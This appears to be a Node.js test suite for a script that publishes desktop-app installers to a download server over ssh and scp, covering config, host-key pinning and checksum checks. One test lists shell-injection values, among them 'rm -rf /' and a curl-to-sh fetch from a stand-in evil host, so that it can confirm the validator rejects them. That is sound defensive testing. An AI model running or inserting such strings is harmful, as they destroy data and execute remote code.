const assert = require('node:assert/strict')
const fs = require('node:fs')
const os = require('node:os')
const path = require('node:path')
const test = require('node:test')
const {
  assertSafeVersion,
  installerFileNames,
  buildLatestManifest,
  formatLatestJson,
  parsePublishArgs,
  collectInstallers,
  missingInstallerMessage,
  pickWindowsArtifact,
  buildPublishPlan,
  publishDlLanding,
  assertSafeRemoteRoot,
  quoteRemotePath,
  readPublishConfigFile,
  resolvePublishTarget,
  assertPublishTarget,
  assertKnownHostsFile,
  parseExpectedChecksums,
  readExpectedChecksums,
  assertExpectedChecksums,
  verifyUploadCandidates,
  fileSha256,
} = require('./publish-dl-landing.cjs')

// Every test supplies the origin explicitly. The script has no built-in defaults, and an
// empty `sources` would otherwise let a developer's own dl-landing.config.json leak in and
// make the "refuses to run without configuration" tests pass for the wrong reason.
const NO_SOURCES = { env: {}, config: {} }
const TARGET = {
  host: '203.0.113.9',
  port: '2222',
  user: 'deploy',
  key: '/home/ci/.ssh/landing',
  knownHosts: '/home/ci/.ssh/landing_known_hosts',
  remoteRoot: '/srv/dl-landing',
}

function scratch() {
  return fs.mkdtempSync(path.join(os.tmpdir(), 'xingmang-dl-landing-test-'))
}

// A scratch directory lives under the OS temp root, which is outside the repository, so
// a known_hosts file written there passes the "not inside the public repo" guard.
function writeKnownHosts(directory) {
  const filePath = path.join(directory, 'known_hosts')
  fs.writeFileSync(filePath, '[origin.invalid]:2222 ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFakeKeyForTests\n', 'utf8')
  return filePath
}

test('accepts a dotted release version and rejects a path-like value', () => {
  assert.equal(assertSafeVersion('0.1.22'), '0.1.22')
  assert.equal(assertSafeVersion('1.2.3-beta.1'), '1.2.3-beta.1')
  assert.throws(() => assertSafeVersion('../etc/passwd'), /版本号不合法/)
  assert.throws(() => assertSafeVersion(''), /版本号不合法/)
})

test('accepts an absolute landing directory and trims its trailing slashes', () => {
  assert.equal(assertSafeRemoteRoot('/srv/dl-landing'), '/srv/dl-landing')
  assert.equal(assertSafeRemoteRoot('/srv/dl-landing///'), '/srv/dl-landing')
  assert.equal(assertSafeRemoteRoot('  /srv/dl-landing_v2.1  '), '/srv/dl-landing_v2.1')
})

test('rejects every remote root that could reach the remote shell as a command', () => {
  for (const injected of [
    '/www/dl; rm -rf /',
    '/www/dl && curl http://evil.example/x | sh',
    '/www/dl`id`',
    '/www/dl$(id)',
    '/www/dl$HOME',
    '/www/dl|tee /etc/cron.d/x',
    '/www/dl\nrm -rf /',
    '/www/dl with space',
    '/www/dl*',
    '/www/dl"x"',
    "/www/dl'x'",
    '/www/../etc',
    '/..',
    'srv/dl-landing',
    '../dl-landing',
    '',
    '/',
    '///',
    undefined,
    42,
  ]) {
    assert.throws(() => assertSafeRemoteRoot(injected), /远端目录不合法/, `should reject ${String(injected)}`)
  }
})

test('rejects an injected remote root wherever it enters the script', async () => {
  assert.throws(() => parsePublishArgs(['--remote-root', '/www/dl; id'], TARGET, NO_SOURCES), /远端目录不合法/)
  assert.throws(
    () => buildPublishPlan({ version: '0.1.22', remoteRoot: '/www/dl`id`' }, {}, installerFileNames('0.1.22')),
    /远端目录不合法/,
  )
  await assert.rejects(
    () => publishDlLanding({ ...TARGET, version: '0.1.22', localDir: '.', remoteRoot: '/www/dl && id', sources: NO_SOURCES }, {}),
    /远端目录不合法/,
  )
})

test('wraps a remote path in single quotes and escapes any quote inside it', () => {
  assert.equal(quoteRemotePath('/srv/dl-landing'), "'/srv/dl-landing'")
  assert.equal(quoteRemotePath("/www/it's"), "'/www/it'\\''s'")
})

test('names landing installers after the electron-builder artifacts', () => {
  assert.deepEqual(installerFileNames('0.1.22'), {
    win: 'XingMang-AI-Manager-0.1.22-Setup.exe',
    macArm64: 'XingMang-AI-Manager-0.1.22-arm64.dmg',
    macX64: 'XingMang-AI-Manager-0.1.22-x64.dmg',
    windowsArtifact: 'windows-release-0.1.22',
    testSignedArtifact: 'TEST-SIGNED-DO-NOT-PUBLISH-0.1.22',
  })
})

test('builds latest.json paths that match those installer file names', () => {
  assert.deepEqual(buildLatestManifest('0.1.22'), {
    version: '0.1.22',
    win: '/files/latest/XingMang-AI-Manager-0.1.22-Setup.exe',
    macArm64: '/files/latest/XingMang-AI-Manager-0.1.22-arm64.dmg',
    macX64: '/files/latest/XingMang-AI-Manager-0.1.22-x64.dmg',
  })
  assert.equal(
    formatLatestJson(buildLatestManifest('0.1.22')),
    `${JSON.stringify(buildLatestManifest('0.1.22'), null, 2)}\n`,
  )
})

test('parses operator flags and treats dry-run as a non-upload', () => {
  const options = parsePublishArgs([
    '--version', '0.1.22',
    '--local-dir', 'C:\\bags',
    '--mac-dir', 'D:\\mac',
    '--run-id', '99',
    '--dry-run',
    '--yes',
    '--port', '2022',
  ], { ...TARGET, version: '9.9.9' }, NO_SOURCES)
  assert.equal(options.version, '0.1.22')
  assert.equal(options.localDir, 'C:\\bags')
  assert.equal(options.macDir, 'D:\\mac')
  assert.equal(options.runId, '99')
  assert.equal(options.dryRun, true)
  assert.equal(options.yes, false)
  assert.equal(options.port, 2022)
})

test('collects the three landing files and ignores update extras', () => {
  const directory = scratch()
  try {
    const nested = path.join(directory, 'windows-release-0.1.22')
    fs.mkdirSync(nested, { recursive: true })
    const names = installerFileNames('0.1.22')
    fs.writeFileSync(path.join(nested, names.win), 'exe')
    fs.writeFileSync(path.join(nested, `${names.win}.blockmap`), 'map')
    fs.writeFileSync(path.join(nested, 'latest.yml'), 'yml')
    fs.writeFileSync(path.join(directory, names.macArm64), 'arm')
    fs.writeFileSync(path.join(directory, names.macX64), 'intel')
    fs.writeFileSync(path.join(directory, `XingMang-AI-Manager-0.1.22-arm64.zip`), 'zip')

    const found = collectInstallers([directory], names)
    assert.equal(path.basename(found.win), names.win)
    assert.equal(path.basename(found.macArm64), names.macArm64)
    assert.equal(path.basename(found.macX64), names.macX64)
    assert.equal(missingInstallerMessage(names, found), '')
  } finally {
    fs.rmSync(directory, { recursive: true, force: true })
  }
})

test('explains that mac installers are not in the Windows GitHub artifact', () => {
  const names = installerFileNames('0.1.22')
  const message = missingInstallerMessage(names, { win: 'a.exe', macArm64: '', macX64: '' })
  assert.match(message, /XingMang-AI-Manager-0.1.22-arm64.dmg/)
  assert.match(message, /release-build 只出 Windows/)
})

test('picks the newest unexpired windows-release artifact and refuses a test-signed-only set', () => {
  const artifacts = [
    {
      name: 'windows-release-0.1.22',
      expired: false,
      created_at: '2026-08-01T00:00:00Z',
      workflow_run: { id: 11 },
      id: 1,
    },
    {
      name: 'windows-release-0.1.22',
      expired: false,
      created_at: '2026-08-25T00:00:00Z',
      workflow_run: { id: 22 },
      id: 2,
    },
    {
      name: 'TEST-SIGNED-DO-NOT-PUBLISH-0.1.22',
      expired: false,
      created_at: '2026-08-26T00:00:00Z',
      workflow_run: { id: 33 },
      id: 3,
    },
  ]
  assert.deepEqual(pickWindowsArtifact(artifacts, '0.1.22'), {
    name: 'windows-release-0.1.22',
    id: 2,
    runId: 22,
    size: undefined,
  })
  assert.equal(pickWindowsArtifact([], '0.1.22'), null)
  assert.throws(
    () => pickWindowsArtifact(artifacts.filter((item) => item.name.startsWith('TEST-')), '0.1.22'),
    /自签名测试包/,
  )
})

test('plans scp destinations under the landing files directory', () => {
  const names = installerFileNames('0.1.22')
  const plan = buildPublishPlan(
    { version: '0.1.22', remoteRoot: '/srv/dl-landing' },
    { win: 'w.exe', macArm64: 'a.dmg', macX64: 'x.dmg' },
    names,
  )
  assert.equal(plan.uploads[0].remoteDir, '/srv/dl-landing/files/latest')
  assert.equal(plan.manifestRemote, '/srv/dl-landing/latest.json')
  assert.equal(plan.manifest.win, `/files/latest/${names.win}`)
})

test('does not scp until --yes and writes the local manifest only after a successful upload', async () => {
  const directory = scratch()
  const names = installerFileNames('0.1.22')
  const commands = []
  const verified = []
  try {
    fs.mkdirSync(path.join(directory, 'dl-landing'), { recursive: true })
    fs.writeFileSync(path.join(directory, names.win), 'exe')
    fs.writeFileSync(path.join(directory, names.macArm64), 'arm')
    fs.writeFileSync(path.join(directory, names.macX64), 'intel')
    const knownHosts = writeKnownHosts(directory)

    const preview = await publishDlLanding({
      ...TARGET,
      version: '0.1.22',
      localDir: directory,
      yes: false,
      key: path.join(directory, 'id'),
      knownHosts,
      cwd: directory,
      sources: NO_SOURCES,
    }, {
      collectInstallers,
      downloadWindowsArtifact() {
        throw new Error('should not download when --local-dir is set')
      },
      runTool() {
        throw new Error('should not ssh on a preview run')
      },
      cwd: directory,
    })
    assert.equal(preview.uploaded, false)
    assert.equal(fs.existsSync(path.join(directory, 'dl-landing', 'latest.json')), false)

    fs.writeFileSync(path.join(directory, 'id'), 'key')
    const uploaded = await publishDlLanding({
      ...TARGET,
      version: '0.1.22',
      localDir: directory,
      yes: true,
      key: path.join(directory, 'id'),
      knownHosts,
      remoteRoot: '/srv/dl-landing',
      cwd: directory,
      sources: NO_SOURCES,
    }, {
      collectInstallers,
      downloadWindowsArtifact() {
        throw new Error('should not download when --local-dir is set')
      },
      verifyUploadCandidates(options, plan) {
        verified.push(plan.uploads.map((item) => item.fileName))
        return { verifiedDirectory: directory, comparedChecksums: [] }
      },
      runTool(command, args) {
        commands.push([command, ...args])
        return { status: 0, stdout: '{"version":"0.1.22"}\n', stderr: '' }
      },
      writeFile: (filePath, body) => fs.writeFileSync(filePath, body, 'utf8'),
      cwd: directory,
    })
    assert.equal(uploaded.uploaded, true)
    // Verification has to happen before the first command reaches the origin.
    assert.deepEqual(verified, [[names.win, names.macArm64, names.macX64]])
    for (const line of commands.filter((item) => item[0] === 'ssh' || item[0] === 'scp')) {
      assert.ok(line.includes('StrictHostKeyChecking=yes'), `${line[0]} must pin the host key`)
      assert.ok(line.includes(`UserKnownHostsFile=${knownHosts}`), `${line[0]} must use the operator known_hosts`)
    }
    assert.ok(commands.some((line) => line[0] === 'scp' && line.includes(path.join(directory, names.win))))
    assert.ok(commands.some((line) => line[0] === 'scp' && line.includes('deploy@203.0.113.9:/srv/dl-landing/files/latest/')))
    assert.ok(commands.some((line) => line[0] === 'scp' && line.includes('deploy@203.0.113.9:/srv/dl-landing/latest.json')))
    assert.ok(commands.some((line) => line[0] === 'scp' && line.includes('-P') && line.includes('2222')))
    assert.ok(commands.some((line) => line[0] === 'ssh' && line.includes("mkdir -p '/srv/dl-landing/files/latest'")))
    assert.ok(commands.some((line) => line[0] === 'ssh' && line.some((arg) => String(arg).startsWith("chown www:www '/srv/dl-landing/latest.json' '"))))
    assert.ok(commands.some((line) => line[0] === 'ssh' && line.some((arg) => String(arg).includes("cat '/srv/dl-landing/latest.json'"))))
    assert.deepEqual(
      JSON.parse(fs.readFileSync(path.join(directory, 'dl-landing', 'latest.json'), 'utf8')),
      buildLatestManifest('0.1.22'),
    )
  } finally {
    fs.rmSync(directory, { recursive: true, force: true })
  }
})

test('refuses to publish when any part of the origin configuration is missing', async () => {
  for (const field of ['host', 'port', 'user', 'key', 'knownHosts', 'remoteRoot']) {
    const partial = { ...TARGET }
    delete partial[field]
    assert.throws(
      () => parsePublishArgs([], partial, NO_SOURCES),
      /缺少源站配置/,
      `should refuse to run without ${field}`,
    )
    await assert.rejects(
      () => publishDlLanding({ ...partial, version: '0.1.22', localDir: '.', sources: NO_SOURCES }, {}),
      /缺少源站配置/,
      `publishDlLanding should refuse to run without ${field}`,
    )
  }
  assert.throws(() => parsePublishArgs([], {}, NO_SOURCES), /源站主机/)
  assert.throws(() => parsePublishArgs([], {}, NO_SOURCES), /DL_LANDING_SSH_HOST/)
})

test('treats a blank value as missing rather than as an origin', () => {
  assert.throws(
    () => parsePublishArgs([], { ...TARGET, host: '   ' }, NO_SOURCES),
    /缺少源站配置/,
  )
  assert.deepEqual(
    resolvePublishTarget({ env: { DL_LANDING_SSH_HOST: '  ' }, config: { host: '198.51.100.7' } }),
    { host: '198.51.100.7', port: '', user: '', key: '', knownHosts: '', remoteRoot: '' },
  )
  assert.throws(() => assertPublishTarget({}), /缺少源站配置/)
  assert.equal(assertPublishTarget(TARGET), TARGET)
})

test('reads the origin from environment variables and from the ignored local config file', () => {
  const fromEnv = parsePublishArgs([], {}, {
    env: {
      DL_LANDING_SSH_HOST: '198.51.100.7',
      DL_LANDING_SSH_PORT: '2022',
      DL_LANDING_SSH_USER: 'deploy',
      DL_LANDING_SSH_KEY: '/keys/landing',
      DL_LANDING_KNOWN_HOSTS: '/keys/landing_known_hosts',
      DL_LANDING_REMOTE_ROOT: '/srv/dl-landing/',
    },
    config: {},
  })
  assert.equal(fromEnv.host, '198.51.100.7')
  assert.equal(fromEnv.port, 2022)
  assert.equal(fromEnv.user, 'deploy')
  assert.equal(fromEnv.key, '/keys/landing')
  assert.equal(fromEnv.knownHosts, '/keys/landing_known_hosts')
  assert.equal(fromEnv.remoteRoot, '/srv/dl-landing')

  const fromFile = parsePublishArgs([], {}, { env: {}, config: { ...TARGET, port: 2022 } })
  assert.equal(fromFile.host, TARGET.host)
  assert.equal(fromFile.port, 2022)

  // A command-line flag wins over the environment, which wins over the config file.
  const layered = parsePublishArgs(['--host', '192.0.2.5'], {}, {
    env: { DL_LANDING_SSH_HOST: '198.51.100.7', DL_LANDING_SSH_USER: 'envuser' },
    config: { ...TARGET, user: 'fileuser' },
  })
  assert.equal(layered.host, '192.0.2.5')
  assert.equal(layered.user, 'envuser')
})

test('rejects a port that is not a usable TCP port', () => {
  for (const port of ['0', '70000', 'ssh', '22.5']) {
    assert.throws(() => parsePublishArgs([], { ...TARGET, port }, NO_SOURCES), /SSH 端口/)
  }
})

test('prints help without any origin configuration at all', () => {
  const options = parsePublishArgs(['--help'], {}, NO_SOURCES)
  assert.equal(options.help, true)
})

test('reads a local config file when present and stays silent when it is absent', () => {
  const directory = scratch()
  try {
    assert.deepEqual(readPublishConfigFile({}, directory), {})
    fs.writeFileSync(path.join(directory, 'dl-landing.config.json'), JSON.stringify(TARGET), 'utf8')
    assert.deepEqual(readPublishConfigFile({}, directory), TARGET)

    const elsewhere = path.join(directory, 'outside.json')
    fs.writeFileSync(elsewhere, JSON.stringify({ host: '192.0.2.5' }), 'utf8')
    assert.deepEqual(readPublishConfigFile({ DL_LANDING_CONFIG: elsewhere }, directory), { host: '192.0.2.5' })

    fs.writeFileSync(path.join(directory, 'dl-landing.config.json'), '{ oops', 'utf8')
    assert.throws(() => readPublishConfigFile({}, directory), /不是合法的 JSON/)
  } finally {
    fs.rmSync(directory, { recursive: true, force: true })
  }
})

test('keeps the production origin out of the public repository', () => {
  const source = fs.readFileSync(path.join(__dirname, 'publish-dl-landing.cjs'), 'utf8')
  // An IPv4 literal, an ssh key file name or an absolute site root in this script would be
  // the very leak P-04 removed, so fail the build rather than let one come back.
  assert.equal(/\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b/.test(source), false, 'no hard-coded origin IP')
  assert.equal(/_ed25519|_rsa\b/.test(source), false, 'no hard-coded ssh key file name')
  assert.equal(/\/www\/wwwroot/.test(source), false, 'no hard-coded site root')
  assert.equal(/DEFAULT_(HOST|PORT|USER|REMOTE_ROOT|KEY_NAME)/.test(source), false, 'no built-in origin defaults')

  for (const name of fs.readdirSync(path.join(__dirname, '..', 'dl-landing', 'nginx'))) {
    assert.equal(name.endsWith('.conf'), false, `${name} must stay a .conf.example template`)
  }
  const proxy = fs.readFileSync(
    path.join(__dirname, '..', 'dl-landing', 'nginx', '01-api-proxy.conf.example'),
    'utf8',
  )
  assert.equal(/\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}:\d+/.test(proxy), false, 'no backend address in the template')
  assert.match(proxy, /__ACCOUNT_UPSTREAM__/)
})

test('P-27: pins the origin host key and refuses a known_hosts file it cannot trust', () => {
  const directory = scratch()
  try {
    const knownHosts = writeKnownHosts(directory)
    assert.equal(assertKnownHostsFile(knownHosts), knownHosts)
    assert.throws(() => assertKnownHostsFile(''), /缺少 known_hosts 文件/)
    assert.throws(() => assertKnownHostsFile('   '), /缺少 known_hosts 文件/)
    assert.throws(() => assertKnownHostsFile(path.join(directory, 'nope')), /找不到 known_hosts 文件/)

    const empty = path.join(directory, 'empty_known_hosts')
    fs.writeFileSync(empty, '', 'utf8')
    assert.throws(() => assertKnownHostsFile(empty), /为空或不是普通文件/)
    assert.throws(() => assertKnownHostsFile(directory), /为空或不是普通文件/)

    // The repository is public, so a host key file inside it would publish the origin.
    assert.throws(
      () => assertKnownHostsFile(path.join(__dirname, '..', 'known_hosts')),
      /不能放在仓库目录里/,
    )
  } finally {
    fs.rmSync(directory, { recursive: true, force: true })
  }
})

test('P-28: hashes an installer without holding it in memory', async () => {
  const directory = scratch()
  try {
    const filePath = path.join(directory, 'installer.bin')
    // Large enough that fs.createReadStream hands the hash more than one chunk.
    const chunk = Buffer.alloc(64 * 1024, 7)
    const handle = fs.openSync(filePath, 'w')
    for (let index = 0; index < 8; index += 1) fs.writeSync(handle, chunk)
    fs.closeSync(handle)

    const expected = require('node:crypto')
      .createHash('sha256')
      .update(Buffer.concat(Array.from({ length: 8 }, () => chunk)))
      .digest('hex')
    assert.equal(await fileSha256(filePath), expected)
  } finally {
    fs.rmSync(directory, { recursive: true, force: true })
  }
})

test('P-29: reads the CI checksum printout and rejects a file that does not match', async () => {
  const directory = scratch()
  const names = installerFileNames('0.1.22')
  try {
    const win = path.join(directory, names.win)
    fs.writeFileSync(win, 'exe', 'utf8')
    const digest = await fileSha256(win)
    const uploads = [{ slot: 'win', local: win, fileName: names.win }]

    const listing = [
      'Some unrelated line the operator pasted along',
      `${names.win}  3 bytes  SHA256=${digest.toUpperCase()}`,
      `${names.win}.blockmap  12 bytes  SHA256=${'a'.repeat(64)}`,
    ].join('\n')
    const expected = parseExpectedChecksums(listing)
    assert.equal(expected.get(names.win), digest)
    assert.deepEqual(await assertExpectedChecksums(uploads, expected), [names.win])

    await assert.rejects(
      () => assertExpectedChecksums(uploads, parseExpectedChecksums(`${names.win}  3 bytes  SHA256=${'b'.repeat(64)}`)),
      /SHA-256 与校验清单不一致/,
    )
    await assert.rejects(
      () => assertExpectedChecksums(uploads, parseExpectedChecksums(`other.exe  3 bytes  SHA256=${'b'.repeat(64)}`)),
      /没有任何一个要上传的文件/,
    )
    assert.throws(() => parseExpectedChecksums('nothing parseable here'), /没有一行能解析出 SHA-256/)
    assert.throws(
      () => parseExpectedChecksums([
        `${names.win}  3 bytes  SHA256=${'a'.repeat(64)}`,
        `${names.win}  3 bytes  SHA256=${'b'.repeat(64)}`,
      ].join('\n')),
      /两个不同的 SHA-256/,
    )

    const listingFile = path.join(directory, 'checksums.txt')
    fs.writeFileSync(listingFile, listing, 'utf8')
    assert.equal(readExpectedChecksums(listingFile).get(names.win), digest)
    assert.throws(() => readExpectedChecksums(path.join(directory, 'missing.txt')), /找不到校验清单/)
  } finally {
    fs.rmSync(directory, { recursive: true, force: true })
  }
})

test('P-29: refuses to upload when the local release check does not pass', async () => {
  const directory = scratch()
  const names = installerFileNames('0.1.22')
  try {
    const win = path.join(directory, names.win)
    fs.writeFileSync(win, 'exe', 'utf8')
    const plan = { uploads: [{ slot: 'win', local: win, fileName: names.win }] }

    // The Actions artifact always carries latest.yml; an exe on its own cannot be checked.
    await assert.rejects(
      () => verifyUploadCandidates({ version: '0.1.22' }, plan, {
        validateLocalRelease() {
          throw new Error('should not validate a directory without latest.yml')
        },
      }),
      /没有 latest\.yml/,
    )

    fs.writeFileSync(path.join(directory, 'latest.yml'), 'version: 0.1.22\n', 'utf8')
    await assert.rejects(
      () => verifyUploadCandidates({ version: '0.1.22' }, plan, {
        validateLocalRelease() {
          throw Object.assign(new Error('更新文件 SHA-512 不匹配：Setup.exe'), { code: 'LOCAL_ARTIFACT_HASH_MISMATCH' })
        },
      }),
      /已拒绝上传.*LOCAL_ARTIFACT_HASH_MISMATCH/s,
    )

    const seen = []
    const result = await verifyUploadCandidates({ version: '0.1.22' }, plan, {
      validateLocalRelease(releaseDirectory, options) {
        seen.push([releaseDirectory, options.expectedVersion])
        return {}
      },
    })
    assert.deepEqual(seen, [[directory, '0.1.22']])
    assert.equal(result.verifiedDirectory, directory)
    assert.deepEqual(result.comparedChecksums, [])
  } finally {
    fs.rmSync(directory, { recursive: true, force: true })
  }
})
